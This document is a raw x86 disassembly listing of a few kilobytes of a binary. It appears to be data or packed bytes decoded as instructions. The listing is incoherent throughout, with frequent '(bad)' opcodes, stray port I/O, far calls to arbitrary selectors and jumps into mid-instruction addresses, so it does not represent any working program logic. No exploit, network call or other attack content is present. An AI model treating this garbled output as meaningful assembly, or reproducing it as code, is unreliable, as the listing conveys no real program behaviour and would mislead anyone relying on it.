  49476f:	push   edi
  494770:	sub    edi,edi
  494772:	inc    ebp
  494773:	(bad)  
  494774:	pop    ebp
  494775:	lods   al,BYTE PTR ds:[esi]
  494776:	sbb    DWORD PTR [eax-0x59],eax
  494779:	das    
  49477a:	mov    eax,ds:0xaf62dae5
  49477f:	das    
  494780:	cmp    cl,ah
  494782:	test   BYTE PTR [ecx],dl
  494784:	and    esp,DWORD PTR [edi+0x3e]
  494787:	or     esp,DWORD PTR [ebp*1+0x28fb774a]
  49478e:	push   0x671f1d20
  494793:	pusha  
  494794:	ror    DWORD PTR [edx+0x4f07bf30],0x34
  49479b:	mov    al,0x7d
  49479d:	pop    ds
  49479e:	pop    ss
  49479f:	xlat   BYTE PTR ds:[ebx]
  4947a0:	sbb    BYTE PTR [ecx+eiz*4+0x7423190],al
  4947a7:	fisub  DWORD PTR [esi+edx*8]
  4947aa:	nop
  4947ab:	cmpps  xmm4,XMMWORD PTR [edx],0x42
  4947af:	mov    ds:0x5adf2f5f,al
  4947b4:	push   eax
  4947b5:	cwde   
  4947b6:	out    dx,eax
  4947b7:	ret    
  4947b8:	pusha  
  4947b9:	ret    0xa88
  4947bc:	fistp  WORD PTR [edi+0x305a28c2]
  4947c2:	pop    es
  4947c3:	mov    bh,0x41
  4947c5:	jne    0x4947dc
  4947c7:	fld    TBYTE PTR [edi+0x4ac06f34]
  4947cd:	add    BYTE PTR [esi-0x9],ch
  4947d0:	daa    
  4947d1:	push   ecx
  4947d2:	pop    ebx
  4947d3:	xchg   edx,eax
  4947d4:	jmp    0x49479d
  4947d6:	ss pop ss
  4947d8:	sub    ah,BYTE PTR [eax]
  4947da:	xor    al,0x74
  4947dc:	mov    bh,0x36
  4947de:	fbstp  TBYTE PTR [eax-0x20aa9db6]
  4947e4:	out    dx,eax
  4947e5:	pop    eax
  4947e6:	test   ch,cl
  4947e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4947e9:	and    edx,DWORD PTR [edi]
  4947eb:	sub    esp,DWORD PTR ds:0xf7a7404e
  4947f1:	push   eax
  4947f2:	lods   eax,DWORD PTR ds:[esi]
  4947f3:	stos   BYTE PTR es:[edi],al
  4947f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4947f5:	inc    edi
  4947f6:	scas   eax,DWORD PTR es:[edi]
  4947f7:	dec    ebx
  4947f8:	dec    ebp
  4947f9:	xor    BYTE PTR [eax],0x43
  4947fc:	pop    DWORD PTR [edi+0x79]
  4947ff:	add    BYTE PTR [esi+0x444740],al
  494805:	xor    dl,dl
  494807:	and    cl,bh
  494809:	or     BYTE PTR [ebx+0x0],al
  49480c:	xor    eax,0xb3570a4
  494811:	dec    edi
  494812:	inc    edx
  494813:	push   edi
  494814:	inc    esp
  494815:	dec    eax
  494816:	aad    0x2f
  494818:	pop    ss
  494819:	inc    esp
  49481a:	rcr    DWORD PTR [edx],0x62
  49481d:	xor    BYTE PTR [edi+0x34],al
  494820:	add    BYTE PTR [esi+0x46d7140c],dl
  494826:	dec    esp
  494827:	add    BYTE PTR [ecx+0x28b06f01],ch
  49482d:	mov    ecx,edx
  49482f:	(bad)  
  494830:	scas   eax,DWORD PTR es:[edi]
  494831:	enter  0xd117,0x40
  494835:	push   edi
  494836:	inc    ecx
  494837:	aaa    
  494838:	inc    edx
  494839:	add    BYTE PTR [ecx],dh
  49483b:	jb     0x4948ad
  49483d:	fwait
  49483e:	pop    edx
  49483f:	scas   eax,DWORD PTR es:[edi]
  494840:	xor    BYTE PTR [ebx-0x21ad5a73],dh
  494846:	push   edi
  494847:	adc    ebx,DWORD PTR [eax-0x7f]
  49484a:	pop    ebx
  49484b:	mov    ebx,0x48529027
  494850:	jmp    0xb5ed8770
  494855:	fwait
  494856:	mov    eax,0xa26acb37
  49485b:	(bad)  
  49485c:	jecxz  0x494855
  49485e:	xor    ch,bh
  494860:	adc    al,0x34
  494862:	mov    cl,0x64
  494864:	xor    DWORD PTR [edi+0x4a488300],ebx
  49486a:	iret   
  49486b:	xchg   BYTE PTR [ebx],bl
  49486d:	inc    eax
  49486e:	popa   
  49486f:	fistp  WORD PTR [ebx]
  494871:	test   DWORD PTR ds:0x45c61724,esi
  494877:	inc    esp
  494878:	fld    TBYTE PTR [esi-0x64a7a5ac]
  49487e:	iret   
  49487f:	pop    es
  494880:	or     ebp,DWORD PTR [ecx-0x2c]
  494883:	(bad)  
  494884:	mov    es,esp
  494886:	jns    0x49482d
  494888:	nop
  494889:	ss xchg ebx,eax
  49488b:	mov    esi,0x41156a4f
  494890:	push   DWORD PTR [edi+0x60]
  494893:	sub    dh,BYTE PTR [edx]
  494895:	mov    eax,ds:0x400c334f
  49489a:	stos   BYTE PTR es:[edi],al
  49489b:	and    BYTE PTR [edi+0x30945817],bl
  4948a1:	push   ss
  4948a2:	daa    
  4948a3:	inc    esp
  4948a4:	stos   BYTE PTR es:[edi],al
  4948a5:	push   es
  4948a6:	mov    al,0x9a
  4948a8:	(bad)  
  4948a9:	or     al,0x82
  4948ab:	mov    ecx,eax
  4948ad:	iret   
  4948ae:	xor    eax,0xd09b512f
  4948b3:	inc    esi
  4948b4:	repz pop ds
  4948b6:	and    al,BYTE PTR [edx]
  4948b8:	sahf   
  4948b9:	pop    eax
  4948ba:	(bad)  
  4948bb:	aaa    
  4948bc:	popa   
  4948bd:	xor    eax,0x6f31bad2
  4948c2:	xor    edi,DWORD PTR [eax+edx*1-0x55]
  4948c6:	cmovae ecx,DWORD PTR [edi]
  4948c9:	aaa    
  4948ca:	stos   DWORD PTR es:[edi],eax
  4948cb:	add    dl,ch
  4948cd:	adc    eax,DWORD PTR es:[edi+ebp*1-0x6a]
  4948d2:	push   esi
  4948d3:	fdivr  DWORD PTR [eax-0x51]
  4948d6:	ja     0x494948
  4948d8:	mov    WORD PTR gs:[eax],cs
  4948db:	scas   eax,DWORD PTR es:[edi]
  4948dc:	dec    edi
  4948dd:	je     0x4948f7
  4948df:	inc    esp
  4948e0:	das    
  4948e1:	jae    0x494914
  4948e3:	push   edi
  4948e4:	adc    BYTE PTR [esi+0x45],0x2a
  4948e8:	add    BYTE PTR [edi+0x2b121a17],ch
  4948ee:	adc    DWORD PTR ds:[edi],0xfffffff7
  4948f2:	inc    ecx
  4948f3:	adc    al,0x56
  4948f5:	or     DWORD PTR [ecx+0x7],ecx
  4948f8:	mov    edx,0x7f445892
  4948fd:	ja     0x494936
  4948ff:	outs   dx,DWORD PTR ds:[esi]
  494900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  494901:	inc    edx
  494902:	adc    ah,bh
  494904:	or     edx,DWORD PTR [esi+0x4fa43e1e]
  49490a:	xchg   ebx,eax
  49490b:	adc    ecx,0x40
  49490e:	mov    ds:0xb68cdf27,al
  494913:	dec    edx
  494914:	jp     0x49498d
  494916:	pop    ds
  494917:	xchg   DWORD PTR [eax],ebp
  494919:	add    ch,BYTE PTR [esi+0x45ffef2c]
  49491f:	sub    al,0x38
  494921:	xor    DWORD PTR [edi+0x75],esi
  494924:	xor    DWORD PTR [eax-0x3b],ebp
  494927:	jg     0x4948f8
  494929:	xor    al,BYTE PTR [ecx-0x45a9ab]
  49492f:	daa    
  494930:	enter  0x16c8,0x85
  494934:	aaa    
  494935:	stos   DWORD PTR es:[edi],eax
  494936:	outs   dx,BYTE PTR ds:[esi]
  494937:	cwde   
  494938:	fdiv   DWORD PTR [eax-0x2770b095]
  49493e:	adc    cl,BYTE PTR [esi+0x9]
  494941:	mov    dh,0x22
  494943:	pusha  
  494944:	adc    al,0xad
  494946:	scas   eax,DWORD PTR es:[edi]
  494947:	lahf   
  494948:	pop    edi
  494949:	mov    cl,0x8e
  49494b:	shl    BYTE PTR [ecx+0x20053f4f],1
  494951:	push   ebp
  494952:	xor    bh,0x17
  494955:	adc    al,0x2a
  494957:	(bad)  
  494958:	outs   dx,DWORD PTR ds:[esi]
  494959:	neg    DWORD PTR [edi]
  49495b:	adc    ebp,DWORD PTR [ebx+0x6f2bd123]
  494961:	mov    bh,0xb0
  494963:	mov    ss,WORD PTR ds:0x58b33f97
  494969:	jo     0x4949bd
  49496b:	ret    0x58a7
  49496e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49496f:	mov    ch,0x1
  494971:	aas    
  494972:	pop    ebx
  494973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494974:	push   eax
  494975:	pop    ss
  494976:	xor    BYTE PTR [edx+0x76a23727],bl
  49497c:	inc    eax
  49497d:	mov    eax,ds:0x136451ff
  494982:	sub    ebp,DWORD PTR [edi-0x71]
  494985:	and    eax,0x1fa58307
  49498a:	xor    al,BYTE PTR [edi+0x68]
  49498d:	xor    al,0x8c
  49498f:	das    
  494990:	pop    ss
  494991:	lds    ebp,FWORD PTR [eax+0x2a]
  494994:	add    eax,0x12a50ed7
  494999:	ret    0x7f30
  49499c:	fbld   TBYTE PTR [esi+eax*2+0x5f43b818]
  4949a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4949a4:	mov    al,ds:0x43870945
  4949a9:	xchg   edi,eax
  4949aa:	sub    BYTE PTR [ebx],0x6a
  4949ad:	mov    bl,0xff
  4949af:	popa   
  4949b0:	adc    al,0x19
  4949b2:	pop    eax
  4949b3:	pop    DWORD PTR [ebp+0x57ad8d58]
  4949b9:	(bad)
  4949bd:	push   esi
  4949be:	pusha  
  4949bf:	pusha  
  4949c0:	xchg   edi,eax
  4949c1:	push   eax
  4949c2:	or     al,0x62
  4949c4:	test   DWORD PTR [edi],edi
  4949c6:	aas    
  4949c7:	add    esp,esp
  4949c9:	and    DWORD PTR [edx],0x41003237
  4949cf:	mov    WORD PTR [ebx+0x383492e4],cs
  4949d5:	xor    eax,0x262a514b
  4949da:	aas    
  4949db:	not    DWORD PTR [edi-0x396fca60]
  4949e1:	pop    edi
  4949e2:	test   DWORD PTR [edx],edx
  4949e4:	inc    esi
  4949e5:	(bad)  [edi]
  4949e7:	mov    bh,0x5f
  4949e9:	in     al,0xe8
  4949eb:	test   DWORD PTR [edx+0x31c65f4f],esp
  4949f1:	pop    esp
  4949f2:	ror    BYTE PTR [edx+0x2d],1
  4949f5:	mov    edi,0xec652167
  4949fa:	pop    edx
  4949fb:	daa    
  4949fc:	(bad)  
  4949fd:	ins    DWORD PTR es:[edi],dx
  4949fe:	push   ss
  4949ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  494a00:	push   ebp
  494a01:	jecxz  0x494a4d
  494a03:	xlat   BYTE PTR ds:[ebx]
  494a04:	push   0x4627b3eb
  494a09:	in     al,0x12
  494a0b:	dec    edx
  494a0c:	xor    bh,cl
  494a0e:	xor    DWORD PTR cs:[eax],ebp
  494a11:	pop    edx
  494a12:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  494a14:	push   edi
  494a15:	daa    
  494a16:	adc    ebp,0x87466069
  494a1c:	add    al,BYTE PTR [edx+0x2a]
  494a1f:	adc    al,0xaf
  494a21:	xor    al,0xae
  494a23:	les    esp,FWORD PTR [eax+0x70348f67]
  494a29:	or     al,0x2
  494a2b:	lds    esp,FWORD PTR [edi-0x17b8e04e]
  494a31:	mov    al,0x75
  494a33:	xor    dh,BYTE PTR [edi]
  494a35:	into   
  494a36:	pusha  
  494a37:	add    edx,DWORD PTR [esi-0x80]
  494a3a:	scas   eax,DWORD PTR es:[edi]
  494a3b:	mov    edi,0x828dd1c
  494a40:	xchg   edi,eax
  494a41:	call   0x1f68:0x5a5d84af
  494a48:	scas   eax,DWORD PTR es:[edi]
  494a49:	shr    BYTE PTR [ebx],cl
  494a4b:	sub    eax,0x365bf384
  494a50:	loop   0x494a58
  494a52:	xor    DWORD PTR [ebp+0x1f],ebx
  494a55:	ss test esp,0xbf5b1b01
  494a5c:	xlat   BYTE PTR ds:[ebx]
  494a5d:	push   esi
  494a5e:	shr    DWORD PTR [edx],0xb8
  494a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494a62:	mov    bh,0x87
  494a64:	adc    ebx,eax
  494a66:	push   0xffffff96
  494a68:	das    
  494a69:	addr16 (bad) 
  494a6b:	adc    eax,0x37e781a7
  494a70:	ins    BYTE PTR es:[edi],dx
  494a71:	sub    BYTE PTR ds:0x66237759,dh
  494a77:	add    bl,BYTE PTR [ebx+0xb66f93]
  494a7d:	mov    bl,0x8d
  494a7f:	inc    ebp
  494a80:	pop    edi
  494a81:	inc    edi
  494a82:	push   edx
  494a83:	adc    ecx,DWORD PTR [ebx+ebx*1+0x563f3027]
  494a8a:	xor    eax,0x6743c489
  494a8f:	push   es
  494a90:	nop
  494a91:	js     0x494a9e
  494a93:	inc    edi
  494a94:	outs   dx,DWORD PTR ds:[esi]
  494a95:	jg     0x494a19
  494a97:	popf   
  494a98:	push   es
  494a99:	mov    edi,ebx
  494a9b:	xor    DWORD PTR [edi-0x73],esp
  494a9e:	adc    ebx,ebx
  494aa0:	adc    edi,esi
  494aa2:	addr16 adc cl,cl
  494aa5:	add    eax,0x3458f93
  494aaa:	add    ebx,DWORD PTR [ecx-0x24ced8f8]
  494ab0:	push   eax
  494ab1:	shr    DWORD PTR [esi+0x17],0x97
  494ab5:	cmp    BYTE PTR [edi+0x6d],ch
  494ab8:	or     eax,0xe2f70b6a
  494abd:	test   BYTE PTR [eax],dh
  494abf:	sbb    bh,cl
  494ac1:	xchg   DWORD PTR [eax],ebp
  494ac3:	push   eax
  494ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  494ac5:	(bad)  
  494ac6:	stos   BYTE PTR es:[edi],al
  494ac7:	out    dx,eax
  494ac8:	mov    al,0x4a
  494aca:	push   cs
  494acb:	inc    esp
  494acc:	inc    esi
  494acd:	aaa    
  494ace:	sub    eax,DWORD PTR [edx]
  494ad0:	adc    dh,BYTE PTR [ebx]
  494ad2:	iret   
  494ad3:	pop    edi
  494ad4:	push   edx
  494ad5:	repnz add al,0x12
  494ad8:	out    0x34,al
  494ada:	or     ecx,DWORD PTR [ebx+0x257f829b]
  494ae0:	adc    ecx,DWORD PTR [esi+eax*2-0x2ecb8001]
  494ae7:	loop   0x494b09
  494ae9:	mov    edi,esp
  494aeb:	inc    edi
  494aec:	ins    BYTE PTR es:[edi],dx
  494aed:	sbb    al,0xb
  494aef:	pop    eax
  494af0:	out    dx,eax
  494af1:	stos   DWORD PTR es:[edi],eax
  494af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494af3:	nop
  494af4:	sub    dh,BYTE PTR [edi+0x3f]
  494af7:	imul   eax,DWORD PTR [eax+0xd],0x71487708
  494afe:	pop    ebx
  494aff:	(bad)  
  494b00:	retf   0x8e17
  494b03:	sahf   
  494b04:	mov    cl,0xd2
  494b06:	xor    ebx,DWORD PTR [ebx-0x2953d855]
  494b0c:	test   BYTE PTR [edi],0x7
  494b0f:	xchg   DWORD PTR [edi-0x73e5bca8],esi
  494b15:	(bad)  
  494b16:	orps   xmm5,XMMWORD PTR [ecx+0x75]
  494b1a:	add    edi,edi
  494b1c:	call   DWORD PTR [eax-0x60]
  494b1f:	pop    eax
  494b20:	xor    BYTE PTR [edi+0x21118a6],ch
  494b26:	iret   
  494b27:	mov    bh,0x30
  494b29:	mov    ah,0x82
  494b2b:	aaa    
  494b2c:	dec    eax
  494b2d:	outs   dx,DWORD PTR ds:[esi]
  494b2e:	pop    es
  494b2f:	adc    BYTE PTR [eax],ch
  494b31:	adc    al,0xf1
  494b33:	pop    ebx
  494b34:	mov    bh,0x54
  494b36:	or     eax,esi
  494b38:	pop    ebx
  494b39:	call   DWORD PTR [ebx-0x9]
  494b3c:	pop    eax
  494b3d:	dec    ebx
  494b3e:	pop    es
  494b3f:	outs   dx,BYTE PTR ds:[esi]
  494b40:	pop    esi
  494b41:	xchg   edi,eax
  494b42:	lahf   
  494b43:	aam    0x8
  494b45:	jne    0x494b61
  494b47:	pop    ds
  494b48:	mov    bh,0x74
  494b4a:	sbb    BYTE PTR [edx+0x154f341c],bl
  494b50:	xchg   edx,eax
  494b51:	shr    BYTE PTR [ebx+eax*4],0x44
  494b55:	pop    es
  494b56:	dec    edi
  494b57:	stos   DWORD PTR es:[edi],eax
  494b58:	fmul   DWORD PTR [edx]
  494b5a:	das    
  494b5b:	das    
  494b5c:	and    eax,ebp
  494b5e:	sub    eax,0x1d25ff18
  494b63:	push   esi
  494b64:	and    DWORD PTR [edi+0x4a],edi
  494b67:	imul   ebp,DWORD PTR [eax],0xffffffd6
  494b6a:	mov    edx,0x13374787
  494b6f:	adc    dh,dl
  494b71:	popa   
  494b72:	out    0x26,eax
  494b74:	pop    ebp
  494b75:	push   eax
  494b76:	test   eax,0x5ff17a7
  494b7b:	and    al,0xbc
  494b7d:	add    esi,DWORD PTR [edi]
  494b7f:	pop    ds
  494b80:	xchg   DWORD PTR [eax+ebp*2+0x54],ebp
  494b84:	pop    edx
  494b85:	(bad)  
  494b86:	fdiv   DWORD PTR [ecx]
  494b88:	mov    al,0x45
  494b8a:	mov    bh,0x67
  494b8c:	cmp    DWORD PTR [ebx],edi
  494b8e:	cmp    cl,BYTE PTR [ebx+ebx*2-0x6811b03c]
  494b95:	and    bh,BYTE PTR [eax+0x4447c1e4]
  494b9b:	inc    ebp
  494b9c:	mov    BYTE PTR [bx+di-0x3948],bl
  494ba1:	lahf   
  494ba2:	fbld   TBYTE PTR [ebp+0x63]
  494ba5:	aam    0xc6
  494ba7:	pop    ds
  494ba8:	mov    ebp,0xdf41c105
  494bad:	xor    eax,0x45713f97
  494bb2:	add    BYTE PTR [edi+ecx*2-0x7bd2c9a9],dh
  494bb9:	xchg   BYTE PTR [ebp+0x2f],al
  494bbc:	ja     0x494bf2
  494bbe:	bound  ebp,QWORD PTR [eax+ecx*4-0x27b158e1]
  494bc5:	pop    eax
  494bc6:	adc    eax,0x2c09d7bf
  494bcb:	ss xor eax,0x81e2ceb3
  494bd1:	fimul  DWORD PTR [edi+0xf]
  494bd4:	sbb    ebp,DWORD PTR [esi]
  494bd6:	leave  
  494bd7:	lods   eax,DWORD PTR ds:[esi]
  494bd8:	loop   0x494b84
  494bda:	inc    DWORD PTR [ebp-0x19]
  494bdd:	pop    ds
  494bde:	lea    edx,[edx]
  494be0:	pop    eax
  494be1:	xlat   BYTE PTR ds:[ebx]
  494be2:	jbe    0x494c1b
  494be4:	pop    ss
  494be5:	add    BYTE PTR [esi],al
  494be7:	sti    
  494be8:	pusha  
  494be9:	push   edi
  494bea:	inc    ebp
  494beb:	xlat   BYTE PTR ds:[ebx]
  494bec:	add    DWORD PTR [ebx-0x3d],edx
  494bef:	and    bh,BYTE PTR [edi]
  494bf1:	(bad)  
  494bf2:	xor    dh,cl
  494bf4:	push   esi
  494bf5:	ins    BYTE PTR es:[edi],dx
  494bf6:	lods   al,BYTE PTR ds:[esi]
  494bf7:	aaa    
  494bf8:	mov    edi,0x1700a337
  494bfd:	and    DWORD PTR [edi],ebp
  494bff:	xor    ebx,DWORD PTR [edi+0x4015aa97]
  494c05:	outs   dx,DWORD PTR ds:[esi]
  494c06:	xchg   edi,eax
  494c07:	into   
  494c08:	loope  0x494c63
  494c0a:	mov    eax,ds:0x8667df43
  494c0f:	and    DWORD PTR [edi+0x4636ffa9],edx
  494c15:	out    0x69,eax
  494c17:	jecxz  0x494c5b
  494c19:	xchg   BYTE PTR [ebp+0x42],al
  494c1c:	adc    DWORD PTR [eax+0x22],ebx
  494c1f:	shl    DWORD PTR [edi+0x6845888e],1
  494c25:	mov    WORD PTR [edi],gs
  494c27:	test   DWORD PTR [edi+0x2774255b],0x79ef26f7
  494c31:	sub    eax,0x2f07878e
  494c36:	sub    ecx,DWORD PTR [eax]
  494c38:	mov    ds:0x275f1560,eax
  494c3d:	adc    al,0x5a
  494c3f:	popa   
  494c40:	xor    bh,bl
  494c42:	into   
  494c43:	mov    ebx,0xc36060da
  494c49:	jno    0x494bf7
  494c4b:	pop    eax
  494c4c:	jo     0x494c75
  494c4e:	jg     0x494c07
  494c50:	shr    BYTE PTR [ebp+0x5c],cl
  494c53:	ret    
  494c54:	cmp    BYTE PTR [edi+0x12ea5f41],ch
  494c5a:	mov    al,0x2a
  494c5c:	out    0x4f,eax
  494c5e:	arpl   WORD PTR [ebp+0x17161460],si
  494c64:	push   ss
  494c65:	adc    al,0x0
  494c67:	(bad)  
  494c68:	dec    ebp
  494c69:	pop    edi
  494c6a:	scas   eax,DWORD PTR es:[edi]
  494c6b:	push   eax
  494c6c:	or     eax,0xf12520d
  494c71:	inc    ecx
  494c72:	jmp    0x494caa
  494c74:	sbb    BYTE PTR [edi],0x9a
  494c77:	je     0x494cd1
  494c79:	adc    BYTE PTR [edi],cl
  494c7b:	pop    edi
  494c7c:	xor    dl,BYTE PTR [esi+0x11]
  494c7f:	ss pop ebx
  494c81:	xchg   DWORD PTR [edi+0xb18a98c],eax
  494c87:	pop    es
  494c88:	aaa    
  494c89:	inc    esi
  494c8a:	test   al,0x5b
  494c8c:	xchg   BYTE PTR [esi+0x17],dl
  494c8f:	das    
  494c90:	cmp    ch,BYTE PTR [ecx]
  494c92:	inc    esp
  494c93:	adc    BYTE PTR [edi],bh
  494c95:	push   esi
  494c96:	mov    ah,BYTE PTR [eax+eiz*2]
  494c99:	or     eax,0xf80d17cf
  494c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494c9f:	mov    ah,0xd7
  494ca1:	pop    edi
  494ca2:	cmp    DWORD PTR [ecx+ecx*8+0x18],0x38c33b6
  494caa:	sbb    eax,0xd1f7f72a
  494caf:	mov    eax,0x32d706e2
  494cb4:	add    eax,0x8f46adef
  494cb9:	dec    ebx
  494cba:	fwait
  494cbb:	pop    ss
  494cbc:	inc    ecx
  494cbd:	cli    
  494cbe:	and    al,0x63
  494cc0:	repz inc ecx
  494cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494cc3:	sub    BYTE PTR [ecx],0x99
  494cc6:	pop    edi
  494cc7:	xor    eax,0x42959036
  494ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494ccd:	xlat   BYTE PTR ds:[ebx]
  494cce:	inc    esi
  494ccf:	mov    al,0x48
  494cd1:	mov    ds:0x3f45bfae,eax
  494cd6:	mov    esi,0x14e86348
  494cdb:	div    DWORD PTR [ebx]
  494cdd:	lods   al,BYTE PTR ds:[esi]
  494cde:	adc    cl,BYTE PTR [ecx]
  494ce0:	mov    eax,0x88a2d787
  494ce5:	inc    ecx
  494ce6:	push   0xe4469d23
  494ceb:	call   0xa3d88307
  494cf0:	adc    DWORD PTR [edx],eax
  494cf2:	fidiv  WORD PTR [ebx]
  494cf4:	imul   ecx,DWORD PTR [edi],0xffffff86
  494cf7:	jo     0x494d4a
  494cf9:	add    DWORD PTR [edi+0x33],ebp
  494cfc:	mov    eax,ds:0x5f455a40
  494d01:	outs   dx,DWORD PTR ds:[esi]
  494d02:	push   eax
  494d03:	or     DWORD PTR [ebx-0x6d],eax
  494d06:	cmp    edi,edi
  494d08:	pop    ss
  494d09:	push   es
  494d0a:	and    ebp,DWORD PTR [edi+eax*1-0x3553f22d]
  494d11:	(bad)  
  494d12:	(bad)  
  494d13:	call   0xd217:0xa7171581
  494d1a:	sbb    ah,bl
  494d1c:	(bad)  
  494d1d:	dec    edi
  494d1e:	adc    bl,BYTE PTR [eax-0x13]
  494d21:	sbb    al,0x55
  494d23:	div    DWORD PTR [eax]
  494d25:	pop    edi
  494d26:	sub    eax,0xdf598dad
  494d2b:	(bad)  
  494d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494d2d:	dec    edx
  494d2e:	sbb    ebx,edx
  494d30:	mov    bh,0xf7
  494d32:	xor    DWORD PTR [ebx+0xa],edx
  494d35:	add    eax,0x8d006f32
  494d3a:	jbe    0x494db0
  494d3c:	aaa    
  494d3d:	cmp    BYTE PTR [edi],bl
  494d3f:	ds mov al,ah
  494d42:	sbb    dl,bh
  494d44:	daa    
  494d45:	inc    ebp
  494d46:	adc    DWORD PTR es:[edx],ebx
  494d49:	inc    eax
  494d4a:	xor    BYTE PTR [edi-0x29],dl
  494d4d:	ins    DWORD PTR es:[edi],dx
  494d4e:	dec    eax
  494d4f:	xor    edi,0x35287134
  494d55:	add    al,BYTE PTR [edi+0x680144cf]
  494d5b:	ins    DWORD PTR es:[edi],dx
  494d5c:	out    0xe7,eax
  494d5e:	arpl   ax,cx
  494d60:	push   ecx
  494d61:	xor    BYTE PTR [eax],dh
  494d63:	out    0x38,eax
  494d65:	(bad)  
  494d66:	stos   BYTE PTR es:[edi],al
  494d67:	inc    eax
  494d68:	test   bh,dh
  494d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494d6b:	pop    edi
  494d6d:	ins    DWORD PTR es:[edi],dx
  494d6e:	push   ebp
  494d6f:	pop    edx
  494d70:	idiv   ebx
  494d72:	inc    edx
  494d73:	das    
  494d74:	mov    ch,0xa0
  494d76:	add    al,0x46
  494d78:	adc    edx,DWORD PTR [bx+si]
  494d7b:	inc    ecx
  494d7c:	call   0x3540905c
  494d81:	sbb    ebx,DWORD PTR [edx]
  494d83:	jno    0x494dd0
  494d85:	pop    ss
  494d86:	xchg   edx,eax
  494d87:	mov    al,0x92
  494d89:	and    cl,BYTE PTR [esi]
  494d8b:	inc    esp
  494d8c:	cmp    ebp,DWORD PTR [edx+0x3ff71561]
  494d92:	xor    al,0x27
  494d94:	push   esi
  494d95:	rcr    DWORD PTR [edx],1
  494d97:	push   ss
  494d98:	pop    ds
  494d99:	daa    
  494d9a:	inc    edx
  494d9b:	push   0x97a796eb
  494da0:	and    BYTE PTR [ecx],ah
  494da2:	xchg   ebp,eax
  494da3:	(bad)  
  494da4:	xlat   BYTE PTR ds:[ebx]
  494da5:	xor    al,BYTE PTR [esi+0x4d]
  494da8:	mov    eax,0x390f0ca8
  494dad:	iret   
  494dae:	rcr    DWORD PTR [ebx+0x15],cl
  494db1:	test   eax,0xac5f8fd3
  494db6:	arpl   WORD PTR [ebx-0xfe034ee],si
  494dbc:	or     al,0xa5
  494dbe:	and    dl,bh
  494dc0:	inc    edi
  494dc1:	and    BYTE PTR [ecx-0x4818f56a],dl
  494dc7:	or     eax,0x722d1a3
  494dcc:	dec    edi
  494dcd:	cmp    DWORD PTR [edx+0x47b82c25],ebx
  494dd3:	push   cs
  494dd4:	aaa    
  494dd5:	pop    ebx
  494dd6:	pop    esp
  494dd7:	inc    esp
  494dd8:	dec    eax
  494dd9:	outs   dx,DWORD PTR ds:[esi]
  494dda:	iret   
  494ddb:	dec    esp
  494ddc:	ins    BYTE PTR es:[edi],dx
  494ddd:	sbb    edx,DWORD PTR [ebx]
  494ddf:	cmp    BYTE PTR [edi+0x38],bl
  494de2:	add    BYTE PTR [edx],bl
  494de4:	sub    eax,0xb11e3f81
  494de9:	xchg   edx,eax
  494dea:	and    cl,BYTE PTR [esi-0x562ff0cd]
  494df0:	enter  0x2fd5,0x38
  494df4:	pop    ss
  494df5:	dec    eax
  494df6:	and    al,0xa6
  494df8:	scas   al,BYTE PTR es:[edi]
  494df9:	pop    ds
  494dfa:	xor    bl,BYTE PTR [esp+edx*8]
  494dfd:	push   eax
  494dfe:	mov    BYTE PTR [edi-0x69],ah
  494e01:	aaa    
  494e02:	and    dl,BYTE PTR [ebx-0x6b]
  494e05:	inc    ecx
  494e06:	xlat   BYTE PTR ds:[ebx]
  494e07:	xor    DWORD PTR [edi],eax
  494e09:	mov    WORD PTR [ebx+0x12],ds
  494e0c:	pop    edi
  494e0d:	pop    edx
  494e0e:	mov    eax,ds:0x474341c5
  494e13:	push   ebp
  494e14:	mov    ch,0xe2
  494e16:	nop
  494e17:	movsx  ecx,WORD PTR [eax-0x74]
  494e1b:	or     BYTE PTR [edi+ebx*8+0x1548480d],cl
  494e22:	ss xor eax,0xc366ac5f
  494e28:	pop    eax
  494e29:	dec    edi
  494e2a:	pop    ss
  494e2b:	mov    edx,0x4f0716c1
  494e30:	call   0xff42:0x25c50aa7
  494e37:	xchg   BYTE PTR ds:0xa73ff853,dl
  494e3d:	scas   eax,DWORD PTR es:[edi]
  494e3e:	xchg   esi,eax
  494e3f:	push   esi
  494e40:	and    eax,0x75af78c
  494e45:	mov    al,0x19
  494e47:	das    
  494e48:	push   edi
  494e49:	xchg   ebp,eax
  494e4a:	mov    al,0x56
  494e4c:	inc    ecx
  494e4d:	ja     0x494e1e
  494e4f:	mov    esp,0xdf580d81
  494e54:	xchg   BYTE PTR [esi+eax*2+0x347f22e8],ch
  494e5b:	ja     0x494ec6
  494e5d:	inc    edx
  494e5e:	sub    DWORD PTR [esi],ecx
  494e60:	mov    bh,0x6a
  494e62:	push   es
  494e63:	(bad)  
  494e64:	lds    ecx,FWORD PTR [edi+0x2f]
  494e67:	xchg   ecx,eax
  494e68:	ss or  ah,al
  494e6b:	mov    bh,0x37
  494e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494e6e:	scas   al,BYTE PTR es:[edi]
  494e6f:	outs   dx,BYTE PTR ds:[esi]
  494e70:	arpl   WORD PTR [edi],di
  494e72:	xor    eax,0x28614de7
  494e77:	dec    eax
  494e78:	inc    edi
  494e79:	inc    ebx
  494e7a:	lods   eax,DWORD PTR ds:[esi]
  494e7b:	test   al,0xa5
  494e7d:	inc    esp
  494e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494e7f:	pop    edi
  494e80:	push   ecx
  494e81:	mov    edx,0xa6274055
  494e86:	stos   BYTE PTR es:[edi],al
  494e87:	fs popa 
  494e89:	push   ebp
  494e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
